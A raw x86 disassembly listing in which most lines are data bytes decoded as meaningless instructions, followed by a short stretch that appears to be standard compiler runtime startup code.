  423cc5:	retf   
  423cc6:	inc    ebx
  423cc7:	sub    al,0x4
  423cc9:	jno    0x423c72
  423ccb:	pop    esi
  423ccc:	(bad)  [edx-0x20296ae3]
  423cd2:	lock push ss
  423cd4:	jmp    0x423d1c
  423cd6:	ret    0xc353
  423cd9:	ret    
  423cda:	add    DWORD PTR ds:0x2e15727e,eax
  423ce0:	or     esp,ebx
  423ce2:	ins    DWORD PTR es:[edi],dx
  423ce3:	jns    0x423cd6
  423ce5:	add    ecx,DWORD PTR [eax-0x55074284]
  423ceb:	sbb    esp,eax
  423ced:	xchg   ebp,eax
  423cee:	or     dh,BYTE PTR [edx-0x46]
  423cf1:	dec    eax
  423cf2:	call   0xde10:0xda6e385e
  423cf9:	popf   
  423cfa:	not    DWORD PTR [edx+0x1fc2b425]
  423d00:	js     0x423cbd
  423d02:	(bad)  
  423d03:	pop    esp
  423d04:	xor    eax,0xbc09bf0a
  423d09:	pop    ebx
  423d0a:	imul   esp,edi,0xffffff93
  423d0d:	fidivr DWORD PTR [edx-0x9099960]
  423d13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d14:	push   edi
  423d15:	push   esi
  423d16:	mov    ah,ah
  423d18:	sbb    esi,DWORD PTR [ecx+eiz*1]
  423d1b:	ins    DWORD PTR es:[edi],dx
  423d1c:	mov    cl,0xb2
  423d1e:	jo     0x423d41
  423d20:	and    DWORD PTR [esi],ebx
  423d22:	in     al,0x8f
  423d24:	fild   DWORD PTR [esi+0x2f]
  423d27:	push   ecx
  423d28:	jecxz  0x423d06
  423d2a:	xchg   edx,eax
  423d2b:	jge    0x423d64
  423d2d:	mov    fs,WORD PTR [esi+0x6b]
  423d30:	mov    BYTE PTR [ebp+0x3b],cl
  423d33:	fst    st(3)
  423d35:	mov    ecx,0x69093e1e
  423d3a:	mov    esp,0x8f8ff506
  423d3f:	inc    ebp
  423d40:	xor    ah,BYTE PTR [eax]
  423d42:	nop
  423d43:	xchg   ebx,eax
  423d44:	add    ecx,edi
  423d46:	xchg   esi,eax
  423d47:	int3   
  423d48:	or     DWORD PTR [esp+esi*1+0x28237241],esi
  423d4f:	ret    
  423d50:	push   cs
  423d51:	xlat   BYTE PTR ds:[ebx]
  423d52:	add    al,BYTE PTR [edx-0xee710a3]
  423d58:	cmp    al,0xc1
  423d5a:	mov    WORD PTR [bp+si+0x59],ss
  423d5e:	pop    ecx
  423d5f:	fist   DWORD PTR [eax-0x18a2d7cd]
  423d65:	out    dx,al
  423d66:	mov    al,0xd2
  423d68:	adc    BYTE PTR [edi+0x79715b87],cl
  423d6e:	push   edx
  423d6f:	in     eax,0x2e
  423d71:	adc    bl,BYTE PTR [esi-0x73]
  423d74:	xchg   DWORD PTR [ebx-0x51],ebp
  423d77:	push   ecx
  423d78:	mov    ds:0x3ef1e64a,al
  423d7d:	mov    al,ds:0x8a5f4202
  423d82:	shr    DWORD PTR ds:0x3af0060d,0x91
  423d89:	mov    dh,0x0
  423d8b:	pop    ss
  423d8c:	xchg   esi,eax
  423d8d:	jmp    0x423dfe
  423d8f:	jmp    0x2f591e23
  423d94:	stos   DWORD PTR es:[edi],eax
  423d95:	or     ah,cl
  423d97:	xchg   bh,bl
  423d99:	cmp    ch,BYTE PTR [ebx]
  423d9b:	or     edx,DWORD PTR gs:[edx+edx*2]
  423d9f:	pop    edx
  423da0:	adc    edx,DWORD PTR [ecx-0x216eebb6]
  423da6:	xor    al,0x0
  423da8:	and    ah,BYTE PTR [edi-0x52]
  423dab:	dec    ebx
  423dac:	add    dl,BYTE PTR [eax]
  423dae:	or     eax,0x7ea97bd2
  423db3:	cmp    BYTE PTR [eax-0x3e82dab9],0xc9
  423dba:	in     al,dx
  423dbb:	sub    DWORD PTR [edi],eax
  423dbd:	push   cs
  423dbe:	popf   
  423dbf:	adc    ecx,DWORD PTR [eax+0x1b]
  423dc2:	mov    ebp,0x51653326
  423dc7:	repz ret 
  423dc9:	sahf   
  423dca:	dec    ebx
  423dcb:	jl     0x423d8d
  423dcd:	add    cl,bl
  423dcf:	xchg   esp,eax
  423dd0:	(bad)  
  423dd1:	fmul   st(5),st
  423dd3:	dec    ebp
  423dd4:	push   esp
  423dd5:	mov    ah,0x4e
  423dd7:	pop    ebp
  423dd8:	and    DWORD PTR [edi],esi
  423dda:	jmp    0x423e25
  423ddc:	(bad)  
  423ddd:	mov    ds:0xf2d7fa19,eax
  423de2:	mov    ds:0xb4b4ccc7,eax
  423de7:	fsubr  QWORD PTR [edi+ebp*2-0x5c]
  423deb:	mov    WORD PTR [esi],fs
  423ded:	sbb    bl,BYTE PTR [ebp+0x2d1d09c0]
  423df3:	sbb    BYTE PTR [edi+0x43],0x12
  423df7:	ret    
  423df8:	ds mov ch,0xd7
  423dfb:	mov    ch,0x90
  423dfd:	xor    DWORD PTR [ebx-0x507010d4],eax
  423e03:	push   esi
  423e04:	hlt    
  423e05:	pop    ds
  423e06:	sub    eax,0xc6204027
  423e0b:	mov    esi,0xd2e610bc
  423e10:	js     0x423dac
  423e12:	pop    ecx
  423e13:	scas   eax,DWORD PTR es:[edi]
  423e14:	out    dx,eax
  423e15:	inc    esi
  423e16:	lods   eax,DWORD PTR ds:[esi]
  423e17:	pop    edx
  423e18:	enter  0xd524,0x34
  423e1c:	adc    eax,0x4c9de34f
  423e21:	jp     0x423e66
  423e23:	mov    ecx,ecx
  423e25:	xchg   esi,eax
  423e26:	xchg   DWORD PTR [ecx-0x1234690d],eax
  423e2c:	cmp    ecx,esp
  423e2e:	push   0x7c474ea4
  423e33:	or     al,0x2f
  423e35:	sbb    eax,0xc7ea8bb9
  423e3a:	pop    ebp
  423e3b:	aam    0xa1
  423e3d:	or     ebx,DWORD PTR [edi]
  423e3f:	mov    al,0x74
  423e41:	call   0x4ee0:0x19af4a6c
  423e48:	jnp    0x423ea2
  423e4a:	add    edx,DWORD PTR [ebp-0x2f029cd0]
  423e50:	jnp    0x423e2b
  423e52:	fidivr DWORD PTR [edx+0x6596c5f7]
  423e58:	pop    ss
  423e59:	test   DWORD PTR [edi+0xab6d2f4],esi
  423e5f:	lods   al,BYTE PTR ds:[esi]
  423e60:	lods   eax,DWORD PTR ds:[esi]
  423e61:	dec    eax
  423e62:	inc    ebx
  423e63:	add    BYTE PTR [eax-0x47],dl
  423e66:	inc    eax
  423e67:	popf   
  423e68:	mov    ?,ecx
  423e6a:	mov    al,0xb0
  423e6c:	fwait
  423e6d:	inc    edx
  423e6e:	add    DWORD PTR [esi],ebp
  423e70:	shl    DWORD PTR [ecx-0x448ac2e7],1
  423e76:	jl     0x423dff
  423e78:	pushf  
  423e79:	push   cs
  423e7a:	inc    ecx
  423e7b:	popf   
  423e7c:	sub    dh,BYTE PTR [edx-0x2c1ae4af]
  423e82:	lock mov ds:0x27a9806d,eax
  423e88:	(bad)  
  423e89:	sahf   
  423e8a:	sub    BYTE PTR [eax],ch
  423e8c:	jmp    0xe944:0xe705d05c
  423e93:	enter  0xade4,0x7a
  423e97:	or     DWORD PTR [edi+edx*2],edx
  423e9a:	pusha  
  423e9b:	cmp    al,0x26
  423e9d:	push   cs
  423e9e:	fwait
  423e9f:	int    0xa7
  423ea1:	dec    edx
  423ea2:	push   eax
  423ea3:	icebp  
  423ea4:	or     DWORD PTR [eax+0x7a],ebp
  423ea7:	stos   BYTE PTR es:[edi],al
  423ea8:	add    eax,0x87d01bc1
  423ead:	lds    ecx,FWORD PTR [edx-0xe]
  423eb0:	jmp    0x423eba
  423eb2:	icebp  
  423eb3:	add    eax,0xeec369f
  423eb8:	push   eax
  423eb9:	sub    dh,dl
  423ebb:	xchg   ebp,ebp
  423ebd:	inc    ecx
  423ebe:	daa    
  423ebf:	ror    ecx,cl
  423ec1:	adc    al,BYTE PTR [ebx-0x76]
  423ec4:	gs push esp
  423ec6:	dec    edx
  423ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ec8:	xchg   DWORD PTR [edx-0xa5e7a2b],edx
  423ece:	jl     0x423ee4
  423ed0:	daa    
  423ed1:	pusha  
  423ed2:	pop    edi
  423ed3:	je     0x423eb8
  423ed5:	dec    ebx
  423ed6:	inc    ebp
  423ed7:	cmp    ah,ah
  423ed9:	xor    eax,0x2e482896
  423ede:	std    
  423edf:	sub    ecx,eax
  423ee1:	add    BYTE PTR [edi+0x3762aac7],dh
  423ee7:	nop
  423ee8:	pop    es
  423ee9:	pop    esp
  423eea:	mov    cl,0xde
  423eec:	(bad)  
  423eed:	cmp    ebx,DWORD PTR [esi]
  423eef:	add    al,0xa9
  423ef1:	imul   esi,DWORD PTR [ebp-0x1e],0x6
  423ef5:	cmp    al,0xe
  423ef7:	dec    ebp
  423ef8:	scas   al,BYTE PTR es:[edi]
  423ef9:	mov    ch,0x78
  423efb:	aas    
  423efc:	test   BYTE PTR [edx+0x44b325c8],bh
  423f02:	repz call 0x752c:0x724a6ee5
  423f0a:	in     al,dx
  423f0b:	jmp    0x423efd
  423f0d:	sar    BYTE PTR [ebp-0x65],0x81
  423f11:	pop    eax
  423f12:	nop
  423f13:	es pop esp
  423f15:	sub    BYTE PTR [ecx],bh
  423f17:	scas   al,BYTE PTR es:[edi]
  423f18:	dec    ebp
  423f19:	jns    0x423ee8
  423f1b:	mov    al,0x8c
  423f1d:	shr    ebp,0x48
  423f20:	lea    edi,[eax-0x4b]
  423f23:	test   eax,0x2bc5aa15
  423f28:	mov    eax,ds:0xa7dee534
  423f2d:	js     0x423efe
  423f2f:	inc    ecx
  423f30:	mov    dl,0x4d
  423f32:	cmp    BYTE PTR [ecx+0x7884fc6c],bh
  423f38:	sbb    BYTE PTR [ecx],dh
  423f3a:	push   esi
  423f3b:	aaa    
  423f3c:	test   eax,0xe7742c87
  423f41:	and    ebx,DWORD PTR [ebx+0x69]
  423f44:	leave  
  423f45:	nop
  423f46:	les    edi,FWORD PTR [ebp+eax*8-0x12953404]
  423f4d:	popa   
  423f4e:	je     0x423ee8
  423f50:	xlat   BYTE PTR ds:[ebx]
  423f51:	in     al,0x72
  423f53:	(bad)  
  423f54:	xchg   esi,eax
  423f55:	loop   0x423f5e
  423f57:	sbb    eax,DWORD PTR [ebx-0x6a5de2c3]
  423f5d:	inc    ebx
  423f5e:	cld    
  423f5f:	xor    DWORD PTR [edi-0x80],esi
  423f62:	and    eax,0xe09190be
  423f67:	dec    edx
  423f68:	hlt    
  423f69:	(bad)  [edi-0x35]
  423f6c:	loopne 0x423f84
  423f6e:	push   ebp
  423f6f:	fidivr WORD PTR [edx+eax*4+0x2b]
  423f73:	pop    ss
  423f74:	fwait
  423f75:	(bad)  
  423f76:	ds (bad) 
  423f78:	mov    cl,0xec
  423f7a:	pusha  
  423f7b:	adc    DWORD PTR [ebx],edx
  423f7d:	call   0x649c:0x1ce8c1a8
  423f84:	add    ch,al
  423f86:	mov    esp,0x25fd6d35
  423f8b:	cmp    al,0x5
  423f8d:	les    ebp,FWORD PTR [ecx+ebp*2+0x34]
  423f91:	dec    ebp
  423f92:	hlt    
  423f93:	mov    WORD PTR [eax],ds
  423f95:	xor    edi,0x13
  423f98:	jmp    0xc8bbe51b
  423f9d:	or     al,0x6b
  423f9f:	mov    al,ds:0xfbb018fc
  423fa4:	lock test al,0x91
  423fa7:	rcr    ch,cl
  423fa9:	cmp    al,BYTE PTR [eax]
  423fab:	imul   edi,DWORD PTR [ebx-0x32],0xd0cececc
  423fb2:	or     al,0x23
  423fb4:	aad    0xb3
  423fb6:	aas    
  423fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fb8:	cmp    al,0xbf
  423fba:	dec    esi
  423fbb:	test   eax,0xb172be14
  423fc0:	or     eax,DWORD PTR [eax-0x13dc7fa8]
  423fc6:	or     al,0xd0
  423fc8:	js     0x423f8b
  423fca:	adc    al,0xaf
  423fcc:	aaa    
  423fcd:	sbb    al,0xb2
  423fcf:	(bad)  
  423fd0:	cmp    ebx,DWORD PTR [ecx-0x9cb82d6]
  423fd6:	sbb    esi,DWORD PTR ds:0xaa4f01ff
  423fdc:	mov    eax,ds:0xc6e76233
  423fe1:	aaa    
  423fe2:	pushf  
  423fe3:	push   ds
  423fe4:	cmc    
  423fe5:	or     dh,BYTE PTR [edx+ebx*4+0x15]
  423fe9:	dec    DWORD PTR [eax]
  423feb:	jno    0x424057
  423fed:	and    al,0x28
  423fef:	or     esp,DWORD PTR [ebp+0x22de4320]
  423ff5:	outs   dx,BYTE PTR ds:[esi]
  423ff6:	je     0x423f96
  423ff8:	xchg   ebx,eax
  423ff9:	das    
  423ffa:	mov    eax,0x2050a27e
  423fff:	in     al,0x5
  424001:	jmp    0xcd03:0x73848582
  424008:	es arpl di,bp
  42400b:	loop   0x424055
  42400d:	pop    ebp
  42400e:	dec    ebx
  42400f:	mov    edx,0x68cd47a6
  424014:	test   al,0x67
  424016:	sbb    al,0xf3
  424018:	push   0x7decbb3d
  42401d:	and    eax,0x40517bc4
  424022:	mov    bl,0xe0
  424024:	xor    al,0xb7
  424026:	ret    
  424027:	lds    eax,FWORD PTR ss:[edx-0x7821a911]
  42402e:	adc    dh,BYTE PTR [ebp-0x3fac056e]
  424034:	aaa    
  424035:	mov    ds:0x5cfdff13,eax
  42403a:	xor    ah,0x74
  42403d:	jnp    0x423fdd
  42403f:	cmp    BYTE PTR [edx+0x60],al
  424042:	loop   0x424087
  424044:	mov    al,0xa3
  424046:	push   ebx
  424047:	repnz dec esp
  424049:	fidivr DWORD PTR [edx]
  42404b:	inc    esp
  42404c:	pop    ss
  42404d:	sbb    DWORD PTR [ecx],0xffffffe8
  424050:	cli    
  424051:	xor    al,0x30
  424053:	(bad)  
  424054:	sbb    al,0x3c
  424056:	add    esi,DWORD PTR [esi]
  424058:	int    0xa9
  42405a:	mov    ebx,0x75e8454c
  42405f:	cmp    esp,edx
  424061:	(bad)  
  424062:	call   0x5f2fcdf1
  424067:	outs   dx,BYTE PTR ds:[esi]
  424068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424069:	dec    esi
  42406a:	pusha  
  42406b:	into   
  42406c:	out    dx,al
  42406d:	(bad)  
  42406e:	fild   DWORD PTR [ebp-0x1f837867]
  424074:	out    0x4d,eax
  424076:	lea    esi,[edi+0x5a]
  424079:	and    ebx,DWORD PTR [ebx+0x13da2749]
  42407f:	jbe    0x424032
  424081:	sbb    al,cl
  424083:	in     eax,dx
  424084:	in     al,0x51
  424086:	arpl   sp,di
  424088:	(bad)  
  424089:	ret    0x8ba3
  42408c:	fnstsw WORD PTR [ebx+0x67477234]
  424092:	ret    
  424093:	mov    dh,0xa2
  424095:	shr    DWORD PTR [edi-0x7b8f284a],cl
  42409b:	pop    edi
  42409c:	cwde   
  42409d:	sbb    al,BYTE PTR [edi]
  42409f:	jecxz  0x424104
  4240a1:	(bad)  
  4240a2:	scas   al,BYTE PTR es:[edi]
  4240a3:	das    
  4240a4:	jmp    0x4240c7
  4240a6:	pushf  
  4240a7:	jmp    0x4240f0
  4240a9:	daa    
  4240aa:	adc    DWORD PTR [eax+ebx*4],ebx
  4240ad:	mov    ds:0x44660606,al
  4240b2:	xor    eax,ebp
  4240b4:	dec    esp
  4240b5:	jg     0x42412e
  4240b7:	aaa    
  4240b8:	data16 and al,0xc4
  4240bb:	pop    ebx
  4240bc:	sub    ebp,edi
  4240be:	push   edx
  4240bf:	cmp    dh,BYTE PTR [eax]
  4240c1:	pop    edx
  4240c2:	or     al,0x74
  4240c4:	std    
  4240c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240c6:	fnstsw WORD PTR [ecx-0x795c2dc6]
  4240cc:	(bad)  
  4240cd:	out    0xaf,eax
  4240cf:	xchg   esi,eax
  4240d0:	(bad)  
  4240d1:	pop    esi
  4240d2:	cmp    dl,dh
  4240d4:	push   esi
  4240d5:	mov    dh,dh
  4240d7:	int    0x59
  4240d9:	stc    
  4240da:	push   es
  4240db:	jbe    0x424086
  4240dd:	jns    0x4240e9
  4240df:	cmp    edi,ebx
  4240e1:	mov    BYTE PTR [ebx],bl
  4240e3:	sub    ch,BYTE PTR [esi]
  4240e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240e6:	in     al,0xd
  4240e8:	fdivp  st(7),st
  4240ea:	cmp    al,0x27
  4240ec:	in     eax,0x12
  4240ee:	fistp  DWORD PTR [ebp+0x65]
  4240f1:	sub    ebx,DWORD PTR ss:[edi+ebx*4]
  4240f5:	xchg   ecx,eax
  4240f6:	jecxz  0x42416b
  4240f8:	popf   
  4240f9:	(bad)  
  4240fa:	cdq    
  4240fb:	les    edi,FWORD PTR [ebx-0x2b]
  4240fe:	add    eax,0x4855360b
  424103:	mov    bl,0x99
  424105:	lea    esp,[ebx]
  424107:	pop    ebp
  424108:	jg     0x424097
  42410a:	mov    ebx,0xbe54939d
  42410f:	fcomp  QWORD PTR [edi+ebx*4-0x55]
  424113:	add    DWORD PTR [esi+0x5e97ea76],ebx
  424119:	mov    eax,ds:0xdd8641a
  42411e:	enter  0xf243,0xb
  424122:	repnz (bad) 
  424124:	mov    al,ds:0x289fed88
  424129:	push   edx
  42412a:	fistp  WORD PTR [edx]
  42412c:	cmc    
  42412d:	clc    
  42412e:	outs   dx,BYTE PTR ds:[esi]
  42412f:	jecxz  0x4241a2
  424131:	and    eax,0xfca9ae2e
  424136:	(bad)  
  424137:	cmc    
  424138:	and    al,0x31
  42413a:	ins    BYTE PTR es:[edi],dx
  42413b:	shr    bl,0x9b
  42413e:	pop    esp
  42413f:	mov    esi,0x78465aa2
  424144:	pop    ebp
  424145:	xor    al,0xb1
  424147:	idiv   ebx
  424149:	mov    bh,0x67
  42414b:	ins    DWORD PTR es:[edi],dx
  42414c:	stos   BYTE PTR es:[edi],al
  42414d:	lahf   
  42414e:	and    al,0x29
  424150:	aad    0x9d
  424152:	sub    al,0x98
  424154:	in     al,0xbc
  424156:	in     al,0xd3
  424158:	pusha  
  424159:	cld    
  42415a:	sub    al,0xd3
  42415c:	add    al,0x28
  42415e:	sbb    DWORD PTR [edi+0x2],edi
  424161:	or     al,0x47
  424163:	jns    0x42417a
  424165:	scas   eax,DWORD PTR es:[edi]
  424166:	popa   
  424167:	push   0xffffffeb
  424169:	mov    cl,0xaa
  42416b:	jmp    0x41d:0x3f82ffe7
  424172:	imul   edi,DWORD PTR [edx-0x37],0xffffffb2
  424176:	push   es
  424177:	adc    DWORD PTR [edx-0x45],ebp
  42417a:	add    edi,DWORD PTR [eax+0x14]
  42417d:	fcomi  st,st(6)
  42417f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424182:	retf   0x1dd2
  424185:	shl    DWORD PTR [ebp+0x17],1
  424188:	add    BYTE PTR [ebp+0x5549f8c],dl
  42418e:	sahf   
  42418f:	cmp    edx,DWORD PTR [esi]
  424191:	cmp    DWORD PTR [edi],ebp
  424193:	jge    0x4241de
  424195:	les    esi,FWORD PTR ds:0x328b0963
  42419b:	inc    eax
  42419c:	ret    
  42419d:	add    DWORD PTR [ebx],eax
  42419f:	loop   0x424127
  4241a1:	and    al,0x45
  4241a3:	push   ds
  4241a4:	cmc    
  4241a5:	call   0x490e:0xf9394cc7
  4241ac:	and    edx,DWORD PTR [eax]
  4241ae:	popf   
  4241af:	or     DWORD PTR [esi],edi
  4241b1:	pop    edx
  4241b2:	(bad)  
  4241b3:	into   
  4241b4:	imul   ebx,edi,0x55
  4241b7:	mov    ch,0x9
  4241b9:	cmp    eax,0x657644c8
  4241be:	std    
  4241bf:	scas   eax,DWORD PTR es:[edi]
  4241c0:	ins    DWORD PTR es:[edi],dx
  4241c1:	push   0xd688a720
  4241c6:	or     DWORD PTR [eax],0xffffffd3
  4241c9:	inc    eax
  4241ca:	jge    0x424218
  4241cc:	jns    0x424215
  4241ce:	xchg   ebp,eax
  4241cf:	add    bh,BYTE PTR [edx+0x4724db89]
  4241d5:	pushf  
  4241d6:	add    ch,BYTE PTR [eax]
  4241d8:	imul   eax,DWORD PTR [ebx-0x419026e5],0xffffffcd
  4241df:	lea    edx,[edx]
  4241e1:	cmc    
  4241e2:	(bad)  
  4241e3:	jbe    0x42418c
  4241e5:	add    eax,0xf3590c77
  4241ea:	pop    ss
  4241eb:	bound  ebp,QWORD PTR [ecx+0x665e3256]
  4241f1:	pop    ss
  4241f2:	inc    esi
  4241f3:	enter  0x457c,0xac
  4241f7:	stos   DWORD PTR es:[edi],eax
  4241f8:	jecxz  0x424236
  4241fa:	ret    0x815c
  4241fd:	(bad)  
  4241fe:	mov    dh,0xb6
  424200:	inc    ecx
  424201:	std    
  424202:	mov    fs,WORD PTR [edx+ecx*2]
  424205:	or     ch,BYTE PTR fs:[ecx+0x51de7403]
  42420c:	rol    BYTE PTR [edi],0xa5
  42420f:	pop    ebx
  424210:	fld    DWORD PTR [esi-0x141635ad]
  424216:	lods   al,BYTE PTR ds:[esi]
  424217:	dec    ecx
  424218:	and    al,0xe9
  42421a:	fsubr  QWORD PTR [esi-0x7fdc54d6]
  424220:	mov    cl,0x8d
  424222:	and    BYTE PTR [ecx+0x154a5829],dl
  424228:	ins    BYTE PTR es:[edi],dx
  424229:	xor    dl,BYTE PTR [edi-0x74c4ba34]
  42422f:	jns    0x4241db
  424231:	dec    esp
  424232:	icebp  
  424233:	mov    dl,0x39
  424236:	push   ds
  424237:	xor    al,0xa3
  424239:	pop    eax
  42423a:	fwait
  42423b:	cdq    
  42423c:	ret    0x83fd
  42423f:	imul   ebp,DWORD PTR [bx+di+0x4b55],0xeb46b072
  424248:	sbb    cl,BYTE PTR [esi]
  42424a:	sub    DWORD PTR [edx+esi*2],ebp
  42424d:	mov    eax,0xde55b2a8
  424252:	lods   al,BYTE PTR ds:[esi]
  424253:	jns    0x42427f
  424255:	scas   al,BYTE PTR es:[edi]
  424256:	jmp    DWORD PTR [edx+eax*2]
  424259:	cmp    ah,0x27
  42425c:	jno    0x424225
  42425e:	test   eax,0x868397d
  424263:	in     al,dx
  424264:	mov    BYTE PTR [edx-0x5c837143],ah
  42426a:	ds jp  0x424227
  42426d:	jo     0x424287
  42426f:	pusha  
  424270:	sub    dl,0x62
  424273:	pop    eax
  424274:	ret    0x3402
  424277:	gs (bad) 
  424279:	and    cl,ch
  42427b:	dec    edx
  42427c:	adc    bh,dh
  42427e:	loop   0x42420c
  424280:	push   ds
  424281:	outs   dx,DWORD PTR ds:[esi]
  424282:	sub    cl,BYTE PTR [ebx+esi*1]
  424285:	cld    
  424286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424287:	sub    eax,0xfca49f71
  42428c:	ret    0xb971
  42428f:	jmp    0x850b:0x95244ae4
  424296:	mov    eax,0x1865a86b
  42429b:	jl     0x4242be
  42429d:	ss pop ds
  42429f:	add    BYTE PTR [ebp-0x2505afbd],0xa1
  4242a6:	mov    dl,0x8c
  4242a8:	adc    DWORD PTR [eax+0x5a],ecx
  4242ab:	pusha  
  4242ac:	inc    ebp
  4242ad:	and    BYTE PTR [eax+edi*8],0x5e
  4242b1:	fbstp  TBYTE PTR [esi-0x79]
  4242b4:	push   ecx
  4242b5:	cwde   
  4242b6:	dec    esp
  4242b7:	add    al,0x44
  4242b9:	adc    ecx,ecx
  4242bb:	stc    
  4242bc:	jnp    0x424333
  4242be:	lea    esi,[ebx+0x44]
  4242c1:	icebp  
  4242c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242c3:	imul   ebx,DWORD PTR [ecx+0x793afc90],0xffffffae
  4242ca:	and    eax,0x9daca3f1
  4242cf:	jge    0x424343
  4242d1:	xor    DWORD PTR [eax+ebx*2-0x4e343c96],esi
  4242d8:	pop    ecx
  4242d9:	sar    DWORD PTR [edx+0x6d8164ca],1
  4242df:	sbb    DWORD PTR [ebx-0x78],ebp
  4242e2:	clc    
  4242e3:	mov    edi,0x56350865
  4242e8:	loopne 0x4242d4
  4242ea:	push   0xffffffc0
  4242ec:	cli    
  4242ed:	jl     0x4242c7
  4242ef:	call   0xf573715a
  4242f4:	scas   al,BYTE PTR es:[edi]
  4242f5:	mov    ebx,0xb0b20e78
  4242fa:	cdq    
  4242fb:	daa    
  4242fc:	mov    ebx,0xfbf089d4
  424301:	fucomi st,st(4)
  424303:	inc    eax
  424304:	clc    
  424305:	mov    ebx,0x711ad4fb
  42430a:	in     al,dx
  42430b:	shl    ah,cl
  42430d:	mov    ah,0x2b
  42430f:	icebp  
  424310:	and    ebx,ecx
  424312:	mov    al,0x6c
  424314:	sbb    esp,esi
  424316:	inc    edx
  424317:	(bad)  
  424318:	clc    
  424319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42431a:	add    al,dh
  42431c:	jne    0x4242b3
  42431e:	(bad)  
  42431f:	cld    
  424320:	fidivr DWORD PTR [ebx-0x6af8be2b]
  424326:	pop    edx
  424327:	mov    esp,0x66fdcd8d
  42432c:	fwait
  42432d:	jno    0x4242e4
  42432f:	pushf  
  424330:	ss data16 sbb al,0xc
  424334:	ins    BYTE PTR es:[edi],dx
  424335:	adc    eax,0xb425b355
  42433a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42433b:	cwde   
  42433c:	jb     0x424300
  42433e:	in     al,dx
  42433f:	aas    
  424340:	(bad)  
  424341:	or     al,0x56
  424343:	mov    al,0x2b
  424345:	sub    DWORD PTR [ebx-0x60],ebx
  424348:	shl    BYTE PTR [ecx+ebp*8+0x18],cl
  42434c:	aas    
  42434d:	loopne 0x4242e2
  42434f:	stc    
  424350:	xor    BYTE PTR [ebx-0x27],al
  424353:	inc    eax
  424354:	sub    eax,0x4d5b4562
  424359:	jle    0x42432a
  42435b:	outs   dx,BYTE PTR ds:[esi]
  42435c:	aad    0xea
  42435e:	(bad)  
  42435f:	mov    esp,0xb9186cc1
  424364:	and    eax,0x2cbaf7ee
  424369:	adc    esp,DWORD PTR [ecx-0x7df69e21]
  42436f:	shl    BYTE PTR [ecx],0xf7
  424372:	push   ecx
  424373:	cmp    ecx,DWORD PTR [ebp+0x15eaa9a8]
  424379:	dec    esp
  42437a:	loop   0x42439e
  42437c:	sbb    al,bl
  42437e:	dec    ebx
  42437f:	jbe    0x424393
  424381:	pop    ss
  424382:	nop
  424383:	in     eax,0x62
  424385:	nop
  424386:	mov    ds,WORD PTR [edi-0x40]
  424389:	jbe    0x424335
  42438b:	push   ds
  42438c:	or     al,0x90
  42438e:	ja     0x4243ac
  424390:	in     eax,0x7f
  424392:	dec    eax
  424393:	cmp    bh,BYTE PTR [edi]
  424395:	cmp    al,dl
  424397:	jbe    0x424359
  424399:	and    DWORD PTR [ecx-0x1b],ebp
  42439c:	or     DWORD PTR [edi+0x12],edi
  42439f:	out    0xc2,eax
  4243a1:	iret   
  4243a2:	lds    esp,FWORD PTR ds:0x254ec110
  4243a8:	lahf   
  4243a9:	dec    esp
  4243aa:	in     al,dx
  4243ab:	push   eax
  4243ac:	out    0x2,al
  4243ae:	cmc    
  4243af:	mov    al,0x42
  4243b1:	scas   eax,DWORD PTR es:[edi]
  4243b2:	push   ecx
  4243b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243b4:	xlat   BYTE PTR ds:[ebx]
  4243b5:	ret    0x373b
  4243b8:	jcxz   0x42440a
  4243bb:	iret   
  4243bc:	jmp    0xe6fd:0xdf2bb32e
  4243c3:	cmc    
  4243c4:	out    0x4c,al
  4243c6:	out    dx,eax
  4243c7:	ins    DWORD PTR es:[edi],dx
  4243c8:	push   0x4e1cb146
  4243cd:	inc    esi
  4243ce:	scas   eax,DWORD PTR es:[edi]
  4243cf:	xor    eax,0x3b93bd37
  4243d4:	xchg   ah,dl
  4243d6:	ret    0xccd
  4243d9:	and    eax,0x582264ce
  4243de:	imul   esp,DWORD PTR [edi+0x23],0x148ceea4
  4243e5:	rcr    DWORD PTR [edi-0x5e],cl
  4243e8:	or     DWORD PTR [ecx+ebp*8],0x4da67134
  4243ef:	pop    esi
  4243f0:	repnz iret 
  4243f2:	jle    0x424432
  4243f4:	loope  0x42443e
  4243f6:	xchg   esi,eax
  4243f7:	add    ebp,DWORD PTR [edx]
  4243f9:	push   es
  4243fa:	pop    ebp
  4243fb:	sbb    al,0x85
  4243fd:	pop    es
  4243fe:	push   0x0
  424400:	push   0x0
  424402:	call   0x424410
  424407:	xor    eax,eax
  424409:	add    esp,0x10
  42440c:	ret    0x10
  42440f:	nop
  424410:	jmp    DWORD PTR ds:0x429114
  424416:	cmp    DWORD PTR ds:0x45dabc,0x1
  42441d:	jne    0x424424
  42441f:	call   0x424962
  424424:	push   DWORD PTR [esp+0x4]
  424428:	call   0x4247eb
  42442d:	push   0xff
  424432:	call   DWORD PTR ds:0x45d1c0
  424438:	pop    ecx
  424439:	pop    ecx
  42443a:	ret    
  42443b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424442:	jne    0x424449
  424444:	call   0x424962
  424449:	push   DWORD PTR [esp+0x4]
  42444d:	call   0x4247eb
  424452:	push   0xff
  424457:	call   0x424631
  42445c:	pop    ecx
  42445d:	pop    ecx
  42445e:	ret    
  42445f:	push   0x60
  424461:	push   0x429228
  424466:	call   0x425350
  42446b:	mov    edi,0x94
  424470:	mov    eax,edi
  424472:	call   0x4253a0
  424477:	mov    DWORD PTR [ebp-0x18],esp
  42447a:	mov    esi,esp
  42447c:	mov    DWORD PTR [esi],edi
  42447e:	push   esi
  42447f:	call   DWORD PTR ds:0x429058
  424485:	mov    ecx,DWORD PTR [esi+0x10]
  424488:	mov    DWORD PTR ds:0x45dac4,ecx
  42448e:	mov    eax,DWORD PTR [esi+0x4]
  424491:	mov    ds:0x45dad0,eax
  424496:	mov    edx,DWORD PTR [esi+0x8]
